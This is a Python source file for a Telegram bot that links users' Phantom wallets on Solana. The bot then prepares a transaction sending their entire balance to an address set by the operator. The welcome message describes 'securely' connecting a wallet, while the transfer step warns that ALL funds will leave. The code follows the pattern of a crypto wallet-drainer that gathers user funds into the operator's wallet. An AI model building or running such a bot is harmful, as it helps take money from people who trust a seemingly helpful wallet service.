import logging
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from config import TELEGRAM_BOT_TOKEN
from session_manager import SessionManager
from phantom import PhantomUtils
from solana_utils import SolanaUtils
from solders.pubkey import Pubkey

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class PhantomWalletBot:
    def __init__(self):
        """Initialize the bot with required components"""
        if not TELEGRAM_BOT_TOKEN:
            raise ValueError("TELEGRAM_BOT_TOKEN not configured")
            
        self.application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
        self.session_manager = SessionManager()
        self.solana_utils = SolanaUtils()
        
        # Register handlers
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("connect", self.connect_phantom))
        self.application.add_handler(CallbackQueryHandler(self.button_handler))
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [[InlineKeyboardButton("🔗 Connect Phantom Wallet", callback_data="connect_phantom")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🤖 Welcome to the Phantom Wallet Bot!\n\n"
            "This bot allows you to securely connect your Phantom wallet and transfer funds.\n\n"
            "⚠️ SECURITY ALERT: You are about to connect your wallet and potentially transfer ALL funds.\n"
            "Please ensure you understand what you're doing before proceeding.",
            reply_markup=reply_markup
        )
        
    async def connect_phantom(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Generate Phantom connection deep link"""
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        
        # Create a new session for wallet connection
        session_id, session_data = self.session_manager.create_session(user_id, "connect")
        
        # Generate Phantom connect URL
        try:
            connect_url = PhantomUtils.generate_connect_url(session_id)
        except ValueError as e:
            await update.message.reply_text(f"❌ Configuration error: {str(e)}")
            return
            
        keyboard = [[InlineKeyboardButton("Connect to Phantom", url=connect_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "Click the button below to connect your Phantom wallet:\n\n"
            "1. This will open the Phantom app\n"
            "2. Confirm the connection\n"
            "3. You'll be redirected back to Telegram",
            reply_markup=reply_markup
        )
        
    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button clicks"""
        query = update.callback_query
        await query.answer()
        
        if query.data == "connect_phantom":
            await self.connect_phantom(update, context)
        elif query.data.startswith("initiate_transfer_"):
            session_id = query.data.split("_")[2]
            await self.initiate_transfer(query, session_id)
        elif query.data == "cancel":
            await query.edit_message_text("❌ Transfer cancelled.")
            
    async def initiate_transfer(self, query, session_id):
        """Create and send transfer transaction via Phantom deep link"""
        # Get session data
        session_data = self.session_manager.get_session_data(session_id)
        if not session_data or "public_key" not in session_data:
            await query.edit_message_text("❌ Session invalid or expired. Please reconnect your wallet.")
            return
            
        user_id = session_data["user_id"]
        user_pubkey = session_data["public_key"]
        
        # Check rate limit
        if not self.session_manager.check_transfer_limit(user_id):
            await query.edit_message_text(
                "❌ Transfer rate limit exceeded. Please wait before initiating another transfer."
            )
            return
            
        # Get app's public key (for destination)
        app_pubkey = os.getenv("APP_PUBLIC_KEY")
        if not app_pubkey:
            await query.edit_message_text("❌ App configuration error: Public key not set.")
            return
            
        # Create a new session for transfer action
        transfer_session_id, transfer_session_data = self.session_manager.create_session(user_id, "transfer")
        
        # Store wallet public key in new session
        self.session_manager.store_wallet_connection(transfer_session_id, user_pubkey)
        
        # Create transfer transaction
        try:
            message, transfer_amount = self.solana_utils.create_transfer_transaction(user_pubkey, app_pubkey)
        except Exception as e:
            await query.edit_message_text(f"❌ Error creating transaction: {str(e)}")
            return
            
        # Generate Phantom sign transaction URL
        try:
            sign_url = PhantomUtils.generate_sign_transaction_url(message, transfer_session_id)
        except ValueError as e:
            await query.edit_message_text(f"❌ Configuration error: {str(e)}")
            return
            
        keyboard = [
            [InlineKeyboardButton("Sign Transaction in Phantom", url=sign_url)],
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        sol_amount = transfer_amount / 1_000_000_000  # Convert lamports to SOL
        
        await query.edit_message_text(
            f"⚠️ SECURITY ALERT: You are about to transfer ALL your funds!\n\n"
            f"Amount: {sol_amount:.9f} SOL\n"
            f"To: {app_pubkey}\n\n"
            f"Click below to open Phantom and sign the transaction:",
            reply_markup=reply_markup
        )
        
    def run(self):
        """Start the bot"""
        logger.info("Starting Phantom Wallet Bot...")
        self.application.run_polling()

if __name__ == "__main__":
    try:
        bot = PhantomWalletBot()
        bot.run()
    except Exception as e:
        logger.error(f"Failed to start bot: {str(e)}")
